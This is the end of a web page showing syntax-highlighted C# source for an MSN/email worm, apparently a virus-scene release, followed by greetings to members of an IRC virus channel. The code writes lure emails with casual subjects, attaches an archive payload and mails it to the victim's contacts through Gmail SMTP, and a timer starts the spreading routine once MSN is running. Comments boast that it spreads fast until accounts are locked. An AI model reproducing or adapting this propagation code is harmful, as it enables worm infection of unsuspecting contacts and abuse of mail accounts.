</span><span class="sc0">            </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;=</span><span class="sc0"> </span><span class="sc11">files</span><span class="sc10">.</span><span class="sc11">GetUpperBound</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">//get the filename (or it will include the file path)
</span><span class="sc0">                </span><span class="sc11">filess</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">filess</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"!"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">System</span><span class="sc10">.</span><span class="sc11">IO</span><span class="sc10">.</span><span class="sc11">Path</span><span class="sc10">.</span><span class="sc11">GetFileName</span><span class="sc10">(</span><span class="sc11">files</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]);</span><span class="sc0">
                </span><span class="sc2">//count how many files it found
</span><span class="sc0">                </span><span class="sc11">filecount</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">//create array from var "filess" with "!" as delim
</span><span class="sc0">            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">rndfile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">filess</span><span class="sc10">.</span><span class="sc11">Split</span><span class="sc10">(</span><span class="sc7">'!'</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc2">//choose a random file
</span><span class="sc0">            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">rndfile</span><span class="sc10">[</span><span class="sc11">rnd</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">filecount</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)].</span><span class="sc11">ToString</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//function to email the worm to contacts.. kinda really simple
</span><span class="sc0">        </span><span class="sc2">//but affective for spreading fast (atleast until the accounds are locked)
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">MSN_MailWorm</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">

            </span><span class="sc11">Random</span><span class="sc0"> </span><span class="sc11">rnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Random</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">mail1</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"name@gmail.com"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">mail2</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"name@gmail.com"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ToUse</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc11">one</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc10">[</span><span class="sc4">10</span><span class="sc10">];</span><span class="sc0">

            </span><span class="sc2">//pick random accound to mail from
</span><span class="sc0">            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">rnd</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">ToUse</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mail1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">else</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">ToUse</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">mail2</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc2">//some email subjects
</span><span class="sc0">            </span><span class="sc11">one</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"hiya"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">one</span><span class="sc10">[</span><span class="sc4">2</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"hello"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">one</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"hey"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">one</span><span class="sc10">[</span><span class="sc4">4</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"hay"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">one</span><span class="sc10">[</span><span class="sc4">5</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"hi"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">one</span><span class="sc10">[</span><span class="sc4">6</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"read!!"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">one</span><span class="sc10">[</span><span class="sc4">7</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"how are you?"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">one</span><span class="sc10">[</span><span class="sc4">8</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"hi "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" check this out!"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">one</span><span class="sc10">[</span><span class="sc4">9</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"hey "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">" you should see this!"</span><span class="sc10">;</span><span class="sc0">


            </span><span class="sc11">MailMessage</span><span class="sc0"> </span><span class="sc11">MailWorm</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">MailMessage</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">MailWorm</span><span class="sc10">.</span><span class="sc11">To</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">address</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">MailWorm</span><span class="sc10">.</span><span class="sc11">From</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">MailAddress</span><span class="sc10">(</span><span class="sc11">ToUse</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rndMSNmessage</span><span class="sc10">());</span><span class="sc0">
            </span><span class="sc11">MailWorm</span><span class="sc10">.</span><span class="sc11">IsBodyHtml</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">MailWorm</span><span class="sc10">.</span><span class="sc11">Priority</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">MailPriority</span><span class="sc10">.</span><span class="sc11">Normal</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">Nuro</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">myDocs</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"test.rar"</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">MailWorm</span><span class="sc10">.</span><span class="sc11">Attachments</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Attachment</span><span class="sc10">(</span><span class="sc11">Nuro</span><span class="sc10">));</span><span class="sc0">
            </span><span class="sc11">MailWorm</span><span class="sc10">.</span><span class="sc11">Subject</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">one</span><span class="sc10">[</span><span class="sc11">rnd</span><span class="sc10">.</span><span class="sc11">Next</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">9</span><span class="sc10">)];</span><span class="sc0"> </span><span class="sc11">MailWorm</span><span class="sc10">.</span><span class="sc11">Body</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"&lt;table&gt;&lt;tr&gt;&lt;td&gt;"</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">rndMSNmessage</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc6">"&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;"</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">SmtpClient</span><span class="sc0"> </span><span class="sc11">smtpcli</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">SmtpClient</span><span class="sc10">(</span><span class="sc11">smtpserver</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">587</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc11">smtpcli</span><span class="sc10">.</span><span class="sc11">EnableSsl</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">smtpcli</span><span class="sc10">.</span><span class="sc11">DeliveryMethod</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">SmtpDeliveryMethod</span><span class="sc10">.</span><span class="sc11">Network</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">smtpcli</span><span class="sc10">.</span><span class="sc11">Credentials</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">NetworkCredential</span><span class="sc10">(</span><span class="sc11">ToUse</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"your password for both gmail accounts"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">try</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc2">//try send the worm to contacts
</span><span class="sc0">                </span><span class="sc11">smtpcli</span><span class="sc10">.</span><span class="sc11">Send</span><span class="sc10">(</span><span class="sc11">MailWorm</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">catch</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">

            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc2">//wait for msn to start if not already running
</span><span class="sc0">        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">MSNtimer_Tick</span><span class="sc10">(</span><span class="sc5">object</span><span class="sc0"> </span><span class="sc11">sender</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">EventArgs</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">MSNLoaded</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc10">!</span><span class="sc11">online</span><span class="sc10">())</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">MSNtimer</span><span class="sc10">.</span><span class="sc11">Stop</span><span class="sc10">();</span><span class="sc0">
                </span><span class="sc11">Worming</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">online</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">nurofen</span><span class="sc10">.</span><span class="sc11">MyStatus</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">MISTATUS</span><span class="sc10">.</span><span class="sc11">MISTATUS_OFFLINE</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc5">else</span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">  
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//so thats all! not great but it was fun.
</span><span class="sc0">
</span><span class="sc1">/*
 * hello's to all these weird friends of mine:
 * 
 * kefi ----------- dead?
 * free0n ---------- thx for all the help! god's gift to women huh?
 * retr0 ----------- thx for help too! i owe you a strip tease lol
 * slagehammer ---------- thx for buying me a house in the country side ;) lol
 * necro ---------- that place you dream about is turkey because they are all moving to germany!
 * dr3f ----------- your depressing but fun.. pervert! :p
 * ponygrl ---------- erm... I don't know you but welcome to the scene &amp; good luck, nice to know im not the only 1 being terrorized for pics!
 * synge ----------- another god's gift to women.. this is the only thing you have in common with free0n lol
 * WarGame ---------- thx for joining us you'll have fun! get faster internet
 * peter ferrie ---------- it's turnt from fun to habbit! i just need to get away from here.. got a spare room?
 * falckon ----------- good luck with your english lessons , and good luck trying to sleep with me lol
 * And hello to everyone in #virus! (thats on undernet if you didnt know)
 * 
 * sorry to anyone i missed out but i just poked myself in the eye now i'm typing blind!
 * and you've probably noticed in all my work my greets are totally random!
*/</span><span class="sc0">
</span></div></body>
</html>
